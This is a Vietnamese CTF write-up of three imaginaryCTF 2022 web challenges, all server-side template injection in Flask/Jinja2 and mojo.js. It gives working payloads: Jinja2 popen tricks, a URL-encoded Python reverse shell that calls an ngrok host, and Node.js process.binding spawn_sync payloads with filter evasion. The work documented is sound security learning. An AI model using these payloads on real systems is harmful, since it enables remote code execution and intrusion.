---
title: imaginaryCTF 2022
description: Web challenge write up in imaginaryCTF 2022 
summary: Write up of some Web challenge
cover: ./cover.jpg
published: '2022-07-19T22:00:00.000+08:00'
updated: '2022-07-19T12:00:00.000+08:00'
tags:
  - [ ctf ]
---

# SSTI Golf

Đề bài cho thẳng source có lỗi SSTI như sau

```python
#!/usr/bin/env python3

from flask import Flask, render_template_string, request, Response

app = Flask(__name__)

@app.route('/')
def index():
    return Response(open(__file__).read(), mimetype='text/plain')

@app.route('/ssti')
def ssti():
    query = request.args['query'] if 'query' in request.args else '...'
    if len(query) > 48:
        return "Too long!"
    return render_template_string(query)

app.run('0.0.0.0', 1337)
```

Check param `query` tại `/ssti` và giới hạn độ dài là 48. Bài này thì easy rồi nên mình cho thẳng payload mình hay dùng.

```python
{{lipsum.__globals__.os.popen('nl *').read()}}
```

![image](https://user-images.githubusercontent.com/75429369/179644681-16ad9d92-6c4c-4e2f-896a-46d4e4f950a8.png)

# minigolf

Một bài SSTI khác nhưng lần này khó hơn ở chỗ tác giả đã filter thêm một số ký tự `{{` `[` `_`

```python
from flask import Flask, render_template_string, request, Response
import html

app = Flask(__name__)

blacklist = ["{{", "}}", "[", "]", "_"]

@app.route('/', methods=['GET'])
def home():
  print(request.args)
  if "txt" in request.args.keys():
    txt = html.escape(request.args["txt"])
    if any([n in txt for n in blacklist]):
      return "Not allowed."
    if len(txt) <= 69:
      return render_template_string(txt)
    else:
      return "Too long."
  return Response(open(__file__).read(), mimetype='text/plain')

app.run('0.0.0.0', 1337)
```

Ban đầu mình cũng cố gắng chắp vá payload bằng những cách thường dùng như dùng `attr|` `dict` nhưng độ dài là rất ít (<= 69).

Sau một hồi thì mình có tham khảo được trang [này](https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/)

Đại khái ý tưởng ở đây sẽ là chèn một chuỗi với độ dài tuỳ thích vào `config`, sau đó ta sẽ `popen` tới nó để sử dụng. Mình test thử nhé. Đầu tiên ta sẽ lưu chuỗi như ý muốn vào `config.a`

Ban đầu mình thử với payload sau nhưng không được

```
?txt={%set t=config.update(a=request.args('a')))%}&a=this is a test mtiennnnn
```

Mình không hiểu tại sao payload này lại không work :) (có ai biết chỉ mình với nha), sau đó mình cho hẳn cái `request.args` thành một biến khác thì lại work.

```python
{%set o=request.args%}{%set b=config.update(a=o.t)%}&t=this is a test mtiennnnn
```

Đọc thử `config.a` thì đã thấy chuỗi mình nhập

![image](https://user-images.githubusercontent.com/75429369/179645383-e56b8dfc-e37a-4b05-a2f1-d91fdebfe75f.png)

Vậy là đạt được mục đích rồi, giờ chỉ cần set up reverse shell nữa là xong

```python
{%set%20o=request.args%}{%set%20b=config.update(a=o.t)%}&t=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28"0.tcp.ap.ngrok.io"%2C14474%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B"%2Fbin%2Fsh"%2C"-i"%5D%29%3B%27
```

Check lại `config.a` lần nữa cho chắc

![image](https://user-images.githubusercontent.com/75429369/179646144-de31d54a-441f-4893-baec-304beed007ee.png)

Oke popen nó là ta có thể rce được rồi

```python
{%set o=request.args%}{%set b=(lipsum|attr(o.t)).os.popen(config.a)%}&t=__globals__
```

![image](https://user-images.githubusercontent.com/75429369/179646491-6aa503cd-b5ea-49ab-b92c-572f3a32baab.png)

_Note: bài này mình cứ ghi thiếu ngoặc với thiếu kí tự gì đấy nên cứ 500 miết =))_

# 1337

Mình đã không giải ra bài này trong lúc diễn ra giải nhưng nhiều thứ mình đã học được và muốn chia sẻ.

```javascript
import mojo from "@mojojs/core";
import Path from "@mojojs/path";

const toLeet = {
  A: 4,
  E: 3,
  G: 6,
  I: 1,
  S: 5,
  T: 7,
  O: 0,
};

const fromLeet = Object.fromEntries(
  Object.entries(toLeet).map(([k, v]) => [v, k])
);

const layout = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>1337</title>
    <link rel="stylesheet" href="static/style.css">
</head>
<body>
    <main>
        <%== ctx.content.main %>
    </main>
    <canvas width="500" height="200" id="canv" />
    <script src="static/matrix.js"></script>
</body>
</html>`;

const indexTemplate = `
<h1>C0NV3R7 70/FR0M L337</h1>
<form id="leetform" action="/">
    <input type="text" id="text" name="text" placeholder="Your text here">
    <div class="switch-field">
        <input type="radio" id="dir-to" name="dir" value="to" checked="checked">
        <label for="dir-to">TO</label>
        <input type="radio" id="dir-from" name="dir" value="from">
        <label for="dir-from">FROM</label>
    </div>
    <input type="submit" value="SUBMIT">
</form>
<div id="links">
  <a href="/source">/source</a>
  <a href="/docker">/docker</a>
</div>
`;

const app = mojo();

const leetify = (text, dir) => {
  const charBlocked = ["'", "`", '"'];
  const charMap = dir === "from" ? fromLeet : toLeet;

  const processed = Array.from(text)
    .map((c) => {
      if (c.toUpperCase() in charMap) {
        return charMap[c.toUpperCase()];
      }

      if (charBlocked.includes(c)) {
        return "";
      }

      return c;
    })
    .join("");

  return `<h1>${processed}</h1><a href="/">â†BACK</a>`;
};

app.get("/", async (ctx) => {
  const params = await ctx.params();
  if (params.has("text")) {
    return ctx.render({
      inline: leetify(params.get("text"), params.get("dir")),
      inlineLayout: layout,
    });
  }
  ctx.render({ inline: indexTemplate, inlineLayout: layout });
});

app.get("/source", async (ctx) => {
  const readable = new Path("index.js").createReadStream();
  ctx.res.set("Content-Type", "text/plain");
  await ctx.res.send(readable);
});

app.get("/docker", async (ctx) => {
  const readable = new Path("Dockerfile").createReadStream();
  ctx.res.set("Content-Type", "text/plain");
  await ctx.res.send(readable);
});

app.start();
```

Tiếp tục là một bài SSTI (được dịp ôn SSTI gớm), ở bài này nó sẽ convert một số ký tự từ chữ sang số và ngược lại. (btw, payload test ssti `<%== 7*7%>`).

Ngoài convert những kí tự như trên thì ở hàm `leetify`, tác giả còn chặn những kí tự như `'` `"` và ```
Tiếp cận bài này ban đầu của mình là mình đi theo hướng URLEncode nhưng không hợp lí vì lấy ví dụ `'` là %27 thì số 7 đã bị block. Nhưng ta còn nhiều hướng khác ví dụ dùng `String.fromCharCode()` và `/blabla/.source` để tạo chuỗi, vậy bắt tay làm nào.

## Hướng tiếp cận

Ở blog trước mình đã có tìm hiểu qua về bài nodejs kiểu vầy rồi, nên mới vào mình sẽ inject ngay 1 payload require `fs` và sử dụng `readdirSync` để đọc directory hiện tại, test ở terminal thì không hề hấn gì

![image](https://user-images.githubusercontent.com/75429369/179691329-c76caeb1-927f-43d4-8601-fdda2d8d4cf9.png)

Lên web thì...

![image](https://user-images.githubusercontent.com/75429369/179691425-277edc1a-4158-4e76-8016-0a3d1103a005.png)

Tới đây mình nghĩ là thằng `require` chắc đã không được define nên chương trình sẽ không chạy nó, định test thử như terminal như hình dưới thì trên web vẫn hiện như hình trên :) 

![image](https://user-images.githubusercontent.com/75429369/179692212-302eca1b-fa9b-4612-9e70-f751614fbcf6.png)

Ngồi research một tí về cách làm, mình tìm thấy trang [này](https://jwlss.pw/mathjs/) . 

![image](https://user-images.githubusercontent.com/75429369/179692820-f11f3231-0e0b-4596-a2b3-46058ebadf04.png)

![image](https://user-images.githubusercontent.com/75429369/179693128-a747e0ea-54dc-4129-b324-73a613b1da59.png)

Có thể dùng `process` thay thế cho `require` để dùng `fs` và đọc file, khá hợp lí trong ngữ cảnh bài này vì khi kiểm tra thử trên web thì `process` hoàn toàn đã được define

```javascript
<%= this.constructor.constructor(/return process/.source)()%>
```

![image](https://user-images.githubusercontent.com/75429369/179693610-4f04e1a6-f7dd-4c9a-bec1-dc653f7efde0.png)

Tới đây tưởng chừng mọi chuyện đã êm trơn nhưng không, đọc lại Dockerfile thì thấy tên của file flag được đặt dựa trên $FLAG_FILENAME mà ta chưa biết là gì :)

```Dockerfile
# syntax=docker/dockerfile:1

FROM node:18-alpine

ENV NODE_ENV=production

WORKDIR /app

COPY ["package.json", "package-lock.json*", "./"]

RUN npm install --production

COPY index.js index.js

COPY Dockerfile Dockerfile

COPY public public

ARG FLAG_FILENAME

COPY flag.txt $FLAG_FILENAME

EXPOSE 3000

CMD ["node", "index.js", "server"]
```

Vậy chỉ còn hướng duy nhất là RCE.

## RCE RCE RCE RCE

Tiếp tục dựa trên link ở trên, ta được thông tin sau:

![image](https://user-images.githubusercontent.com/75429369/179694331-e9a2ba1c-3b01-486d-b53f-02a6ae52bfd7.png)

Ta có thể sử dụng `binding` để thay thế cho `child_process` như thường thấy vì `require` không thể dùng được, và nếu như mình không sai và dựa trên hình trên thì bản chất của `child_process` nó cũng dựa trên thằng `process.binding` này.

Tới đây, khi tiếp tục tìm thêm thông tin về hướng làm này thì mình xem được write up [này](https://blog.ssrf.kr/41) . Trong đó có bài `Safe Evaluator` có cách tiếp cận và hướng làm y hệt, mình lấy tạm payload người ta và về debug :)).

```javascript
process.binding('spawn_sync').spawn({file: '/bin/bash',args: ['bash','-c','ls'],stdio: [{type: 'pipe',readable: 1}]})
```

![image](https://user-images.githubusercontent.com/75429369/179696473-9937724a-4b75-4cc0-9ead-51792b8f69bf.png)

`output` ra null vì `pipe` hiện tại có thể ghi được nên ta thêm thuộc tính `writable` nữa là sẽ có output

![image](https://user-images.githubusercontent.com/75429369/179696715-6eec623f-bce3-4a35-b548-f3c57ccdd2d5.png)

Đã trả về buffer nhưng có gì đấy sai sai, những con số Hex encode từ lệnh `ls` đã đi đâu??? Mình chưa có câu trả lời cho câu hỏi này nhưng tới đây mình suy đoán rằng cái Buffer đang hiện ra chỉ là buffer trỏ vào thằng object `process.binding`, nên ta sẽ thêm vào 1 object nữa để trỏ tới cái `spawn` của lệnh `bin/bash`

```javascript
process.binding('spawn_sync').spawn({file: '/bin/bash',args: ['bash','-c','ls'],stdio: [{type: 'pipe',readable: 1, writable: 1}, {type: 'pipe', writable: 1, readable: 1}]}).output
```

![image](https://user-images.githubusercontent.com/75429369/179698411-37a3ea21-c5e3-4f37-bd68-316335b0a7c1.png)

![image](https://user-images.githubusercontent.com/75429369/179698475-05d3ebfa-aaaa-4535-aff8-f7055f558dca.png)


Thứ ta mong đợi đã có, giờ thì chỉ cần chỉnh payload lại để né được filter để sử dụng lên web chính

```javascript
process.binding(/spawn_sync/.source).spawn({file: String.fromCharCode(9+9+9+9+9+2,98,99+2+2+2,98+2+2+2+2+2+2,9+9+9+9+9+2,98,99-2,98+8+9,98+2+2+2),args: [/bash/.source,/-c/.source,/ls/.source],stdio: [{type: /pipe/.source,readable: 1, writable: 1}, {type: /pipe/.source, writable: 1, readable: 1}]}).output
```

![image](https://user-images.githubusercontent.com/75429369/179701545-88bca9fc-facf-4953-b516-b5871df847c1.png)

Đang vui vì biết nó sẽ ra thôi nhưng không :) 

![image](https://user-images.githubusercontent.com/75429369/179701242-eb666458-09e8-4ec3-a993-4e11d3ad7b17.png)

Tới đây thì mình đã không giải được bài này...

Sau khi vào discord của giải thì mình tìm được payload của 1 player có cách tiếp cận khá giống mình như sau

```javascript
//@splitline#4881 

<%= process.binding(/spawn_sync/.source).spawn({ file: (sh=>/bin//sh).toString().slice(2+2), args: /sh,-c,cat F*/.source.split(/,/.source), stdio: [ { type: /pipe/.source, writable: true, readable: true }, { type: /pipe/.source, writable: true, readable: true } ] }).output %>
```

Thay vì dùng `bash` và dùng `1` thì anh/bạn này dùng `sh` và `true`, thử thay đổi những thứ này vào payload của mình thì đã chạy được

```javascript
<%=process.binding(/spawn_sync/.source).spawn({file: String.fromCharCode(9+9+9+9+9+2,98,99+2+2+2,98+2+2+2+2+2+2,9+9+9+9+9+2,98+8+9,98+2+2+2),args: [/sh/.source,/-c/.source,/ls/.source],stdio: [{type: /pipe/.source,readable: true, writable: true}, {type: /pipe/.source, writable: true, readable: true}]}).output%>
```

![image](https://user-images.githubusercontent.com/75429369/179706252-d51071dc-f5be-4325-9f9f-6f08c230056c.png)

Mình thắc mắc về vấn đề này nên đã đi hỏi tác giả, thì biết rằng `bash` không được install :(, còn cái boolean kia là do phiên bản node của mình đã cũ...

![image](https://user-images.githubusercontent.com/75429369/179706368-3f69a7ca-f009-470a-93da-f82ef928b8ad.png)

Dù không giải được nhưng bài này khá hay vì đã giúp mình biết thêm một cách tiếp cận khi gặp những dạng này.


_Hết rồi_
